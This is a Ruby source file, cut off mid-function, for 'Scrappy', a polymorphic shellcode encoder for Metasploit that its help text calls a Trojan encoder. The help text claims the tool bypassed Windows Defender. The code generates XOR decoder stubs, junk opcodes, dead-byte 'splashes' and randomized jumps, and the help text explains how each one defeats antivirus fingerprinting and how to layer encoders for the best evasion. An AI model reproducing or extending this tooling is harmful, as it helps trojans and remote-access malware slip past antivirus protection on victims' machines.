#!/usr/bin/env ruby

## Salvage is a Radicalware Product programmed by Scouge
## salvage.rb is under the APACHE v2 Licence

module Salvage

	class RabidPackRat < R3EVOLVE::Polymorph
	  	## R3EVOLVE is made to be used with other encoders
	  	## R3Evolve is our Parent class and we will take its defs
	  	## Salvage  is basically a JCP decode builder for scrappy
		attr_accessor :current_step, :steps_taken, :first_jmp

		def initialize(junkie,prep)
			@current_step = 0        
			@steps_taken  = []
			@first_jmp    = 0
			@scrappy_hex  = []
			@scrappy_str  = []
			@junkie       = junkie
			@prep         = prep
			super(junk,junkyard,ss,looper,key,code,reg_div,reserved,stack_hold,stack_count,acthash) 
			## you must inclue all from super (even items you don't need) or you will get an error
			## so grab all or none
		end 

		def asmScrap()

## ===================================================================================
=begin 
Of course the registers and clear-reg method will be randomized,
section1 (prepare the decoder) [0..6]
	chunk1
		0 xor rcx, rcx          0 
		1	push reg            1 > now that you have a null
		2	mov rcx, loop_count 2 > sense you don't have garbage data in the register

	chunk2
		3 jmp to shellcode      0 prep2 (jmp here is calculated at the end of dev)
		4	pop Shellcode       1
		5   shift shellcode     2

	mixed_chunk (can happen anywhere in section 1)
		6 mov rbx, key          0 prep3
----------------------------------------------------------------------------------
section2 all in order [7..11]
	7  xor code              1 decode1
	8  shift code            2
	9  add to key            3
	10  dec looper           4 (not needed for loop)
	11 cmp looper            5 possibly add a pushfq/pushfd so you can pop it back
	   loop / jne              (loop here is calculated at the end of the dev)
	12 call decoder          6 last1 (call is calculated at the end of the dev)

=end
## ===================================================================================


			if @steps_taken.length < 7
				def gt()
					t=$r.rand(0..6)
					while (@steps_taken.index(t) != nil) # while there is a match
						t=$r.rand(0..6)
					end
					return t
				end
				target = gt
				
				# this balances out the location of the mixed_chunk
				fc = lambda { t=$r.rand(0..3); if t>2; x=true;end;return x }
				x = fc.call

				while ((target == 1 and @steps_taken.index(target-1) == nil) \
					or (target == 2 and @steps_taken.index(target-1) == nil) \
					or (target == 4 and @steps_taken.index(target-1) == nil) \
					or (target == 5 and @steps_taken.index(target-1) == nil) \
					or (target == 3 and @steps_taken.index(1) == nil) \
					or (target == 6 and x != true))
					target = gt()
					x = fc.call
				end

				@current_step = target
				
			elsif @steps_taken.length == 7
				@current_step = 7
			end
			
			max_retries = 8
			retry_count = 0
			@current = ''
			badchars_found = true
			while (@current == '' or badchars_found == true)
				badchars_found = false	
				retry_count += 1
				if retry_count > max_retries
					((con(@current).unpack("H*")).join.scan(/../)).each do |x|
						($badchars).each do |y|
							if x == y
								if $silent
									true == true
								else
									puts "\nLast Bad ByteCode: \"\\x"+(con(@current)).unpack("H*").join.scan(/../).join('\x')+"\"\n"
									puts "Last Bad OpCode:   \""+ @current+'"'
									puts ""
									puts "Unable to remove the badchar: \"#{x}\" on asmScrap step \"#{@current_step}\""
									puts "--------------------------------------------------------"
									# I am doing this incorrect operation to trigger "rescue" early
									quit()
								end
							end
						end
					end
				end

				case @current_step
					when 0 # xor rcx, rcx > looper
						@current = (clear($reg[looper][0],$reg[looper][0],$reg[looper][0],'full'))
					when 1 # push rcx > looper
						# change this to the real next step
						@current = (pushit($reg[looper][0]))
						@junkie.update_stack_hold(true)
					when 2 # mov rcx, 0x43
						buf_len = ($buf.length/2-@prep.length/2)
						if $ac != 'x64'
							xor_buf_len = ((buf_len/4)+3)
						else
							xor_buf_len = ((buf_len/8)+7)
						end
						# in 64-bit +5 is required for on of my shellcodes
						loop_count_hex = ([xor_buf_len.to_i].pack("N*").gsub /^\000*/,'').unpack("H*").join
						rs = reg_size(loop_count_hex)
						@current = (mov($reg[looper][rs],'0x'+loop_count_hex))
					when 3 # jmp
						
						if $nni == true
							@current = ("\xe9\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41") 
						else
							@current = ("\xeb\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41")
						end
						@first_jmp = @steps_taken.length
					when 4 # pop
						@current = (popit($reg[code][0]))
						@junkie.update_stack_hold(false)
					when 5 # shift the code over it's offset
						@current = (add($reg[code][0],'0x'+(@prep.length/2).to_s(16)))
					when 6 # mov rbx, key 
						@current = (mov($reg[key][0], $xork))
					
					#            <<<<<<<<<<<<<<<< section1 | section2 >>>>>>>>>>>>>>>>>>>	
					
					when 7 # xor qword [rdx], rbx # decoder (second_seg) start [6..10]
						@current = (ptr_xor_1($reg[code][0],$reg[key][0]))
						@junkie.update_stack_hold(true) 
					when 8 # dec looper # decoder end (removed if $nni == false)
						@current = (dec($reg[looper][0])) # bk & fw split added here [8]
					when 9 # add to key
						@current = (ptr_add_2($reg[key][0],$reg[code][0]))
					when 10 # shift code
						if $ac != 'x64'
							@current = (add($reg[code][0],'0x4'))
						else
							@current = (add($reg[code][0],'0x8'))
						end
					when 11 # cmp rcx, 0x01
						@current = (comp($reg[looper][0],'0x01'))
						# you can't add junk after a cmp without first saving the flags
					when 12
						@current = "\xe8\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42"
					else
						puts ''
				end

				if $badchars.length > 0 and @current_step != 3 and @current_step != 12
					uniq_opcode_hex = (con(@current).unpack("H*").join.scan(/../)).uniq
					if ((uniq_opcode_hex.length + $badchars.uniq.length) != (uniq_opcode_hex + $badchars.uniq).uniq.length)
						# the (code+badchars).uniq will have less than (code.uniq)+(badchars.uniq)
						# if badchars are found. If \x20 is a bad char and it is found, \x20 will occure twice
						badchars_found = true
					end
				end
			end
			if @current_step != 3 and @current_step != 12; @current = con(@current); end
			## don't try to get op-code from the anchors 

			if @current_step < 11 and @current_step != 3
				# less than cmp, add junk
				if $jo != 0
					while salvage.length == 0; @junkie.junkie; end
				end
				@current = salvage + @current
			end

			@steps_taken.push(@current_step)
			@current_step += 1
			@scrappy_hex.push(hex(@current))
			@scrappy_str.push(@current)
		end 

		def to_s; "#{hex(@current)}"; end 
		def scrap_hex; return @scrappy_hex; end
		def scrap_str; return @scrappy_str; end
		def first_jmp; return @first_jmp; end
	end 

	class Start
		## I didn't need to make this class but it sure makes it easier than placing them both into the scrappy.rb
		## This way one change reflects to not only x86 but also x64 and vice versa. If rapid7 used this method,
		## we would have a lot more x64 based encoders.
		def initialize(state,datastore,arch)
			@state = state
			@buffer = state.buf
			@datastore = datastore
			@arch = arch
		end
		def rabid_byte()
		$t = '-------test-------'


		if $help
        	puts '
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Scrappy v1.0.0 (11/21/2017) [github.com/Radicalware] Trojan Encoder
This version of Scrappy uses r3Evolve v1.0.0 by Radicalware
Under the APACHE v2 Licence

"Ill Scrappy the Rabid Pack Rat" hides code like a packer
and it will make your RATs spread like a rabid disease!



IMPORTANT NOTE!!!!
I am releasing this POC code way after I originally quit the development 
for it. Even though there are a lot of problems associeated with the code
it serves the perpose to show that (at the time of release) It could bypass 
Windows Defender. Because are so many issues with it, I decided re-writing it 
from scratch was my best option.

I would not have release this code if I didn\'t tell some people I was going
to release it (which was before I decided to discontinue its production)
Anyway here it is, half ass and all. Enjoy

I decided to leave the comments in there because it may help some of you,
but I wouldn\'t give them too much meritt, some comments could be old and 
give you mis-guided information.

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Note: If your target is a trojan and not an exploit, (which is what Scrappy was 
originally designed for), then you want to allow nulls for the best effect.
If you decide to restrict nulls, Scrappy is still better than shikata_ga_nai,
however if you don\'t restrict nulls, Scrappy is POT POUNDS better than it!!!

Terms you may not know about

Splash: This is when you jump over a large amount of dead (non-executable bytes)
This is good because it basically makes it impossible for AV to fingerprint 
without using some sort of logic. The more logic we can  make AV use, the more
we slow AV down. If we can caues AV to use enough CPU load, customers will get
unhappy and decide to use another vendor. Think about it as brute-forcing WPA,
we can brute force any size, but is it really worth it? So lets dig our pit 
as deep as we can.

Dead Bytes: This is when you throw random bytes at the wall and see what it
makes. This is good because what you get is 100% random. With junk ops, your
code is not 100% random, but it does contain most of the operations you would 
normally see. The con about dead bytes is that it will make op-codes that
can\'t be uesd; so professional AV will know that this section of code is not
part of the decoder and does not need to be scanned or taken seriously. If 
db (dead bytes) are set to false, you will get junk op code instead. For speed
reasons (sense metasm is slow), in 64 bit I replace 5 bytes for one op code 
and in 32 bit, I replace 3 bytes for one op code. 

JCP Offset: This is when you place junk opcode right before the encrypted code.
This is good because if AV decides to fingerprint data right after each call, 
we will confuse the AV. You may think "Wait a minute, isn\'t it xor encrypted?"
Yes, but, XOR nothing but As and you will see the pattern clearly repeate every
4 or 8 chars. That is bad if you are using a well fingerprinted shellcode.
With the offset, they won\'t know where to decrypt after the call. If you also
use splash, you may have several calls (not to mention what is in your
encrypted code). What we do is we shift over the junk code and only decrypt
the encrypted payload, that way we don\'t scramble the good junk ops. 
If off=2 and sm=50 then you could have up to 100 dead opts to shift

header: This is the number of junk op arrays to prepend to the front of your
shellcode. If your jo=25 and your header = 4, you could have up to 100 junk ops.
This is important because AV has fingerprints XOR encryption starting with the
fringerprinted shellcode. If the original key starts on bytes that have not
been fingerprinted, it is more likely AV won\'t detect your shellcode. This is
a week adition though because by simply adding multiple iterations (which you)
should do sense XorAdditiveFeedback isn\'t that great, you already get a header
in front of your shellcode. If you are only using one iteration, then you
should add a header.

footer: This is the number of splashed dead ops to append to your shellcode.
If sm=25 (splash max) and your footer=4, you could have up to 100 dead bytes
appended to the end of your code. Otherwise, no matter how many iterations you
have, your code would always be at the end and could be visible through an xor
lense as shown with the /bin/echo with 300 As shellcode example. This option is
not available if there are any bad bytes specified under the XorAdditiveFeedback

Multiplier: This is what everything is multiplied by to keep you from being 
predictable. For example say you set head to 100 junk ops (which is the
defult). Well AV could easily skip the first 100 junk ops (plus jmps). With
a Multiplier, your header junk would be head*mult..head. So if your
multiplier is 0.5, then you will get between 50 to 100 header junk ops. 
The lower the number, the more range for variation from your hard-set values.

Ruby Inconsistency Check (RIC): Ruby is unfortunatly not very reliable in some
mathmatical calculations. This is most notable when it comes to counting the
number of bytes to calculate the jmp bytes. The higher ric is the more likely
your shellcode is to be error free but also the longer it takes. Think of it
like a casino. The house has only about a 2.5-5% advantage, but give the house
several thousand rounds and the houes will always win. Give ric more rounds
and you will be error free sense ruby has over a 50% chance of success.

Best Practice:
Use MSF to encode less obfuscated versions of scrappy 7 times, then on the 
last itteration, make it really hard, use large splashes, big headers/footers
and of course a good offset. That way you get the most out of your bytes.

Be sure to check github.com/Radicalware to see when I come out with updates.
I know there is a lot I could do to make this better and I am sure the AV 
industry won\'t want to let this slide easily. If AV starts giving me real
problems, I may need to switch to closed source, we will see what happens. 
Don\'t worry, I\'ll still keep the front end MSF friendly.

If No-Nulls are specified the settings will be
Header/Footer  = What you want
Lowest Average = What you want
Junk Ops       = 1 to 2 (Almost non-existent)
Splash         = None except for header/footer
Decoder Offset = Something but very small range

Don\'t use another encoder over a null allowed scrappy or AV will detect that
Encoder that you just placed over scrappy. The last encoder (on the outside)
must be scrappy if scrappy is to have any effect. 

--------------------------------------------------------------------------------
Scrappy output piped into Rmutate will bypass Windows Defender but not Norton.
Here are some known security vulnerabilities that will be up to others to fix.

0. Way dis-proportionate registery use. LEA is used way to much compared to MOV.
1. Key is in plain sight
2. No conditional jmps used for splash
3. No stack managment
4. No junk ops with pointers
5. xor is always used 
6. cmp is always used
7. The loop count is always tested against 0x01
8. There is no add/xor offsets
9. I need to add a 3 stage encryption method. XorAdditiveFeedback is a two 
   stage enc method using Add decoded code to key, then xor key and code.
10. No Reg tracking, adding this would allow me to use bitwise operators to 
    modify current registers. For example I could add an exact value to another
    register to get that register to equal 0x00.
11. There is no option now but later will be an option to remove dead bytes
    completely, including encrypted code. (To make this viable, the jo will need
    to be far more advanced, which it will be.)
12. No junk loops to be brute-forced (This greatly increases the time for
    auto-dbg to analyze code by adding in many more steps with little code inc)

--------------------------------------------------------------------------------
Current Evasive Techniques Used (What was able to code the first time)

1. Junk operations are used to inject themselves between code
2. You can jump over many random bytes to hide the important code.
3. When you jmp to call the code, you don\'t land right at the call.
4. When you call to go back to the jmp, you don\'t return right after the jmp.
5. There is an offset after the called shellcode, which is shifted before just
   before decryption. You then jmp over the junk bytes and straight to the code.
6. The only two legit commands that are placed together is cmp and jne
7. Skews are used on data size and bitwise functions to prevent even averages.

--------------------------------------------------------------------------------
List of Optional Options (If Null Bytes Are Allowed) Defaults set automatically
--------------------------------------------------------------------------------
Effect          | example   |  explanation
--------------------------------------------------------------------------------
Header Junk     | head=2    |  there will be head*jo*mult to head*jo OpCodes
--------------------------------------------------------------------------------
Footer Junk     | foot=1    |  there will be foot*sp*mult to foot*sp bytes
--------------------------------------------------------------------------------
Junk Ops        | jo=25     |  25 junk op-codes for every needed op-code
--------------------------------------------------------------------------------
Decoder Offset  | off=2     |  offset will be between 2*sp*mult to 2*sp bytes
--------------------------------------------------------------------------------
Splash Only     | sp=always |  No random junk ops, only use splash
Splash Mixed    | sp=mixed  |  Use splash and junk ops
Splash None     | sp=never  |  Don\'t use any splash
--------------------------------------------------------------------------------
Splash Chance   | sc=35     |  Splash will happen up to 20% of the junk ops
--------------------------------------------------------------------------------
Splash Max      | sm=600    |  use sm*mult to sm junk bytes in every splash
--------------------------------------------------------------------------------
Multiplier      | mult=0.5  |  This will be your lowest point from your setting
--------------------------------------------------------------------------------
Null Ratio      | nr=20     |  There will be nr*mult to nr percent of 00 in sp
--------------------------------------------------------------------------------
Ruby Check      | ric=8     |  Ruby Inconsistency Check (inc load & dec errors)
--------------------------------------------------------------------------------
No Debugging    | sl        |  Silent allows msfvenom STDIN to work
--------------------------------------------------------------------------------
help            | help      |  display this message
--------------------------------------------------------------------------------

After you run Scrappy, Defaults are marked in red, custom options are in green
If you are script savvy, use Rmutate to develop custom payloads for Metasploit.
--------------------------------------------------------------------------------
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
      		';exit
		end

		if $updates
			puts "You have not updated, you have the Beta.
Always be sure you have the most up-to-date version of illScrappy to have the best chance against up-to-date AV"; exit
		end

		##----------------------------------------------------------------
		## I made these global vars twice sense I programed this outside
		## of the msf framework for speed reasons
		##----------------------------------------------------------------
		@buffer += "\000"
		#$buf = '4831ff4831f648f7e750eb2a59515266682d634989e0526a6848bb2f62696e2f626173534889e752514150574889e64831c0b03b0f05e8d1ffffff2f62696e2f6563686f20204141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414100'
		# above is normal
		# below is XXXXXXXX encoded
		#$buf = '1069a71069ae10afbf08b37201090a3e30753b11d1b80a323010e3773a3136773a392b0b10d1bf0a0919080f10d1be106998e863575db089a7a7a7773a3136773d3b303778781919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191919191958'
		##----------------------------------------------------------------
		# $xork = [@state.key].pack("Q*").unpack("H*").join.gsub /00*$/,''
		# above is the le format (we wannt the one below)
		$xork = '0x'+(@state.key).to_s(16)
		# $xork = '0x5858585858585858'


		$xor_badchars = []
		($xork.scan(/../)[1..-1]).each do |xor_byte|
			(0..255).each do |byte|
				if $badchars.index(([(([byte].pack("V*").gsub /\000*$/,'').unpack("H*").join).to_i(16) ^ (xor_byte).to_i(16)].pack("V*").gsub /\000*$/,'').unpack("H*").join)
					$xor_badchars << (([byte].pack("V*").gsub /\000*$/,'').unpack("H*").join)
				end
			end
		end
		$badchars.each do |byte|
			$xor_badchars << byte
		end
		if $nni == false
			($xork.scan(/../)[1..-1]).each do |xor_byte|
				$xor_badchars << xor_byte
			end
		end

		$xor_badchars.uniq

		##----------------------------------------------------------------
		$ac = @arch.join
		#$ac = 'x64'
		##----------------------------------------------------------------


		def color(content,df)
			if df == nil; "\e[31m#{content}\e[0m\e[37m\e[0m" 
			elsif df == 'header';"\e[32m#{content}\e[0m\e[37m\e[0m"
			else; "\e[33m#{content}\e[0m\e[37m\e[0m";end
		end
		# 0 = normal
		# 1 = bold
		# 2 = 
		# 3 = italic
		# 4 = underline
		# 5,6 = normal
		# 7 = background
		# 8 = invisible
		# 9 = cross through
		## sanity checks
		if $sc > 100; puts color("splash chance 'sc' must be a number lower than 100.
If you want it to happen 100% of the junk ops, then use 'sp=only'. Otherwise it won't happen
100% of the time sense your multiplier will range out your average.
example: sa=0.25",nil);exit;end
		if $mult > 1; puts color("Your multiplier 'mult' must be a floating number lower than 1
example: mult=0.20",nil);exit;end
		if $sp != 'always' and $sp != 'never' and $sp != 'mixed'; puts "splash 'sp' must equal one of the three:
  never|mixed|always"; exit; end

		def white(content);"\e[38m#{content}\e[0m";end 


		reg32 = [
			["eax",  "ax",   "al"  ], # 0
			["ebx",  "bx",   "bl"  ], # 1
			["ecx",  "cx",   "cl"  ], # 2
			["edx",  "dx",   "dl"  ], # 3
			["esi",  "si",   "sil" ], # 4 >> bad sil
			["edi",  "di",   "dil" ], # 5 >> bad dil
			["ebp",  "bp",   "bpl" ], # 6 >> bad bpl
			#  0       1       2   
		]

		reg64 = [
			["rax",  "eax",  "ax",   "al"  ], # 0
			["rbx",  "ebx",  "bx",   "bl"  ], # 1
			["rcx",  "ecx",  "cx",   "cl"  ], # 2
			["rdx",  "edx",  "dx",   "dl"  ], # 3
			["rsi",  "esi",  "si",   "sil" ], # 4
			["rdi",  "edi",  "di",   "dil" ], # 5
			["rbp",  "ebp",  "bp",   "bpl" ], # 6
			["r8",   "r8d",  "r8w",  "r8b" ], # 7
			["r9",   "r9d",  "r9w",  "r9b" ], # 8
			["r10",  "r10d", "r10w", "r10b"], # 9
			["r11",  "r11d", "r11w", "r11b"], # 10
			["r12",  "r12d", "r12w", "r12b"], # 11
			["r13",  "r13d", "r13w", "r13b"], # 12
			["r14",  "r14d", "r14w", "r14b"], # 13
			["r15",  "r15d", "r15w", "r15b"]  # 14
			#  0        1       2       3
		]


		def ruby_check(math)
			## say the odds are 80% success, by only taking the answer when it hits success 5 times in a row
			## your average success will increase because the base is greater than 50% (How else would the
			## casinos win with only about a 2.5-5% edge?). If ruby was 100% reliable, this would not be needed
			## INcrease the "count_max" to increase the reliability but also increase processing time
			count = 0
			count_max = $ric # higher count means higher accuracy but longer loading time
			outcome = math.call
			outcome_ar = []
			until count > count_max
				outcome_ar.push(math.call)
				count += 1
				if outcome_ar.length == count_max
					outcome_ar = outcome_ar.uniq
					if outcome_ar.length != 1
						
						p outcome_ar
						outcome_ar = []
						count = 0
					end
				end
			end
			return outcome_ar[0] # only one item in ar
		end


		def even_hex(hexer)
			hexer = '0x'+(hexer.sub /^0x/,'')
			if hexer.length%2 != 0
				hexer.sub! /0x/,'0x0'
			end;return hexer #<
		end

		def test_bad_bytes(junk_count, xor_it)
			def get_dead_array(junk_count, bad_char_array)
				junk_array = []
				def get_dead_byte
					if ($r.rand(0..100) > $nr) or $nni == false # !!! add variable null byte size
						return ([$r.rand(0..255)].pack("V*").gsub /\000*$/,'').reverse.unpack("H*").join
					else
						return '00'
					end
				end
				while junk_count > 0
					test_byte = get_dead_byte()
					if bad_char_array.index(test_byte) == nil
						junk_array.push(test_byte)
						junk_count -= 1
					end
				end
				return junk_array
			end


			if xor_it == true; bad_char_array = $xor_badchars
			else;              bad_char_array = $badchars; end


			## for some reason this slips up a lot so I needed to re-enforce with a double restart
			count = 0
			count_max = 8 # higher count means higher accuracy but longer loading time
			junk_array = get_dead_array(junk_count, bad_char_array)
			until count > count_max
				count += 1
				if junk_array.uniq.length + bad_char_array.uniq.length != (junk_array + bad_char_array).uniq.length
					junk_array = get_dead_array(junk_count, bad_char_array)
					count = 0
				end

			end
			return junk_array
		end # end test_bad_bytes

		def get_header(junkie)
			if $head > 0
				count = 0
				# change the r8-r64 to a dicitonary
				# add new var that will set the wrapper to true (meaning header/footer)
				header_ar = []
				while count < $head
					junkie.junkie
					header_ar << hex(junkie.salvage)
					count += 1
				end
				forward_junk = (header_ar.join)
			else
				forward_junk = ''
			end
			return forward_junk
		end

		used_regs = [0,3,6] 
		if $nni == false; 
			used_regs.push(2)  # looper
			used_regs.push(12) # r13 gives nulls
		end
		# rax/rdx = used for bitwise function results
		# rbp gives null and is unstable
		# r13 gives null

		if $ac == 'x64'
			$reg = reg64
			$mr  = 14 # max register
			$stack_op = 'rsp'
		else
			$reg = reg32
			$mr  = 6 # don't use ebp
			$stack_op = 'esp'
		end

		regm = $reg.to_a.map(&:inspect)		
		
		def get_rand(used_regs,key_y,dloop)
			max_reg = $mr
			if dloop == 'loop' and $ac != 'x64'
				max_reg = 3
			end
			reg_num = $r.rand(0..max_reg)

			if key_y == true and $badchars.include? "00"
				max_reg = 6 # always 6 for 32 or 64
				reg_num = $r.rand(0..max_reg)
			end
			if dloop == 'loop' and $ac != 'x64'
				max_reg = 3
			end

			while used_regs.include? reg_num 
				reg_num = $r.rand(0..max_reg)
			end
			
			used_regs << reg_num 
			return reg_num,used_regs
		end
		
		if $nni == true
			looper,used_regs = get_rand(used_regs,false,'loop')
		else
			looper = 2
			used_regs << 2
		end		

		key,used_regs    = get_rand(used_regs,false,'') # Change to false and get possible nulls in x64
		code,used_regs   = get_rand(used_regs,true,'')
		$reserved = [looper,key,code]
		
		if $dgb == true
			puts "\nlooper = "+$reg[looper][0]+ " = " + looper.to_s
			puts "key    = "+$reg[key][0]+ " = " + key.to_s
			puts "code   = "+$reg[code][0]+ " = " + code.to_s+"\n\n"
		end

		def hex(bytecode); 
			begin
				bytecode.unpack("H*").join
			rescue
				bytecode.join.unpack("H*").join
			end
		end

		# ss = single scrap, always true when we are doing a small shifty
		junkie = R3EVOLVE::Polymorph.new('',[],false,looper,key,code,[],$reserved,false,0,{})
		
		@buffer = [get_header(junkie)].pack("H*") + @buffer 
		# the preceeding keys can be calculated against a well known payload otherwise. This makes it much tougher.
		$buf = @buffer.unpack("H*").join

		count = 0
		prep = []

=begin	
		# that that way you will process it faster if need be
		junkie.update_ss(true)

		## you don't need to xor test the prep off bytes because it gets detatched from buf and attached to the decoder
		if $nni == false; max_shift = 25;
		else;             max_shift = 109; end

	
		## If you perfer op-code code opposed to dead bytes, swap out this code with the code below
		## I am pretty sure that this is not as good as dead bytes so I did not make it a variable option
	
		junkie.update_key(99); junkie.update_looper(99); junkie.update_code(99)

		until count == $off
			junkie.junkie
			if (prep.join.length/2) > max_shift and $nni == false
				break
			else
				prep.push(hex(junkie.junk)) # junk must be inserted to con
			end
			# add reg, 0x79
			# is the biggest num you can add without getting a null
			count += 1
		end
		junkie.update_ss(false)
		prep = prep.join
		$buf = prep+$buf

		junkie.update_key(key); junkie.update_looper(looper); junkie.update_code(code)
=end
		## dead byte method for what would be the commented out code above


		prep = test_bad_bytes($r.rand(($off*$mult).to_i..$off),false)
		
		prep = prep.join
		$buf = prep+$buf
		## -----------------------------------------------------------
		junkie.junkie
		scrappy = Salvage::RabidPackRat.new(junkie,prep)

		compile = 0
		File.open('tmp',"w"){|f| f.write('')} # !!!!! change this to dbg mode only
		loop do
			#printf"\rAssembling Segment %d",compile
			if $jo > 0; junkie.junkie; end
			scrappy.asmScrap
			#if $dbg == true; puts 'junk = '+hex(junkie.junk) + "\nscrappy = "+scrappy.scrap_hex[-1]; end
			code_track =  "\n\ncompile_count = #{compile}\njunk = "+(hex(junkie.salvage)).scan(/../).join(' ') + "\nscrappy = "+scrappy.scrap_hex[-1].scan(/../).join(' ');
			File.open('tmp',"a"){|f| f.write(code_track+"\n")}
			compile += 1
			break if compile > 12 # ARM
		end

		if $nni == false
			## remove the dec looper, becaues here we get the action 'loop' which mods rcx by default
			scrappy.scrap_hex[8]=''
			scrappy.scrap_str[8]=''
		end

		rasm = scrappy.scrap_hex.join("\n").gsub /4141414141414141414141/,''
		rasm.gsub! /4242424242424242424242/,''

		rmutate = rasm.gsub /\n/,''
		if $dbg == true
			puts rasm+"\n\n"
			system("Rmutate -rasm2 #{rmutate} -64 -k")
		end

		def get_seg(scrappy)
			decoder = scrappy.scrap_hex.join("")
			decoder_size = scrappy.scrap_hex.length/2

			first_seg = scrappy.scrap_hex[0..6] # prepare the decoder # ARM

			first_seg_size = first_seg.join("").length/2

			second_seg = scrappy.scrap_hex[7..12] # return location after loop (step 6) # ARM
			second_seg_size = second_seg.join("").length/2
			return decoder, decoder_size, first_seg, first_seg_size, second_seg, second_seg_size
		end

		decoder, decoder_size, first_seg, first_seg_size, second_seg, second_seg_size = get_seg(scrappy)


		# get the forward/backward splits >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


		junkie.junkie
		call_junk = junkie.salvage.unpack("H*").join
		call_junk_byte_count = (call_junk).length/2

		
		junkie.junkie
		#ret_jmp_junk = junkie.salvage.unpack("H*").join # You can use executable ops but it is not advised sense it is less random
		ret_jmp_junk = test_bad_bytes($r.rand(($off*$mult).to_i..$off),false).join
		ret_jmp_junk_byte_count = (ret_jmp_junk).length/2

		if $nni == true

=begin 
	order of operation          order of calculation               
	--------------------------------------------------------------------------------------------------------
	jne (ready to go back)      third   > jne  over the junk byte count     
	junk_ex_op                  first   > rand junk operations (executed)
	jmp (execute shellcode)     second  > jmp over the 3 segs (last seg will always be a rev byte count)  
	                                      dis = (jmp back 2 or 5) + (5 call)
	junk1 123 bytes - junk_op   first   > rand generate junk byte count (dead zone)
	jmp (back to decoder)       fourth  > 256-byte count all the way back to the start of the decoder
	junk2 up to any bytes       first   > rand generate junk byte count (dead zone)
	call_junk                   zero    > already calculated
	call                        
	>> execute shellcode        
=end

			# first  --------------------------------------------------------------------
			
			# get dead bytes

			junk1rand = $r.rand(15..62)
			junk2rand = $r.rand(15..150) # !!!!!!!! make this set to splash distance
			junk1 = []; junk2 = []
			

			junk1 = test_bad_bytes(junk1rand,false)
			junk2 = test_bad_bytes(junk2rand,false)
			
			# we have hex code, now we need to make it a string to be read as shellcode
			jmp_junk_1 = [(junk1.join)].pack("H*")
			jmp_junk_2 = [(junk2.join)].pack("H*")

			# junk ops between jmp and jne
			junkie.update_ss(true)
			junk_ops = $r.rand(2..5) # !!!! make this an argument
			junk_op_ar = []


			junkie.update_key(99)
			junkie.update_looper(99)
			junkie.update_code(99)

			while junk_ops > 0
				junkie.junkie
				junk_op_ar << hex(junkie.junk)
				junk_ops -=1
			end
			junkie.update_ss(false)
			junk_op = [(junk_op_ar.join)].pack("H*")



			# eb > inc for larger jump and only one byte
			# e9 > always 4 bytes, little endian, tail is null

			# second -------------------------------------------------------------------- forward
			# jne (ready to go back)      third   > jne  over the junk byte count
			# jmp (execute shellcode)     second  > jmp over the 3 segs (last seg will always be a rev byte count)
			
			if $nni == true
				f_dis = 'e9'
				back_jmp_size = 5
			else
				f_dis = 'eb'
				back_jmp_size = 2
			end
			fw_split = [f_dis].pack("H*")

			fw_split_dis = ruby_check((lambda {[((jmp_junk_2.unpack("H*").join.length/2)+(jmp_junk_1.unpack("H*").join.length/2+call_junk_byte_count)+5+back_jmp_size+prep.length/2)].pack("V*")}))

			fw_split = fw_split+fw_split_dis

			# third  -------------------------------------------------------------------- forward
			# jne (ready to go back)      third   > jne  over the junk byte count   

			if $nni == true
				b_dis = 'e9'
				b_inc = 3
			else
				b_dis = 'eb'
				b_inc = 0
			end

			jne_split = ruby_check((lambda {["75"].pack("H*")+([((jmp_junk_1+fw_split+junk_op).unpack("H*").join.length/2)].pack("N*").gsub /^\000*/,'')}))

			# fourth -------------------------------------------------------------------- backward

			bk_split = [b_dis].pack("H*")

			if $nni == true
				bk_split_dis = ruby_check((lambda{[(4294967295-(scrappy.scrap_hex[7..11].join.length)/2-((jne_split+fw_split+jmp_junk_1+junk_op).unpack("H*").join.length/2)-4)].pack("V*")}))
			else
				bk_split_dis = ruby_check((lambda{[(255-(scrappy.scrap_hex[7..11].join.length)/2-((jne_split+fw_split+jmp_junk_1+junk_op).unpack("H*").join.length/2)-1).to_s(16)].pack("H*")}))
			end
			bk_split = bk_split + bk_split_dis

			if $dbg == true
				puts 'jne_split  = '+hex(jne_split)
				puts 'fw_split   = '+hex(fw_split)
				puts 'jmp_junk_1 = '+hex(jmp_junk_1)
				puts 'bk_split   = '+hex(bk_split)
				puts 'jmp_junk_2 = '+hex(jmp_junk_2)
			end
			loop_split = jne_split  + junk_op  + fw_split + jmp_junk_1 + bk_split + jmp_junk_2
		else
=begin 
	order of operation          order of calculation               
	--------------------------------------------------------------------------------------------------------
	loop                        first
	jmp shellcode               third
	junk                        second
	call                        
	>> execute shellcode        
=end

			loop_jmp = ruby_check((lambda{(["e2"].pack("H*") + [(255-(scrappy.scrap_hex[7..11].join.length)/2-1).to_s(16)].pack("H*")).unpack("H*").join }))

			total = 127 - (scrappy.scrap_hex.join.length/2)
			if (total) > 5; total = 5; end
			# calc bytes left
			if total > 0
				jmp_junk = (test_bad_bytes($r.rand(1..total),false)).join
				jmp_junk = (even_hex(jmp_junk)).sub /0x/,''
				fw_jmp = 'eb'+ruby_check(lambda {(even_hex((jmp_junk.length/2+5+prep.length/2+call_junk_byte_count).to_s(16)).sub /0x/,'')})
				if $dbg == true
					puts 'loop_jmp = '+loop_jmp
					puts 'jmp_junk = '+jmp_junk
					puts 'fw_jmp   = '+fw_jmp
				end
				loop_split = [loop_jmp + fw_jmp + jmp_junk].pack("H*")
			else
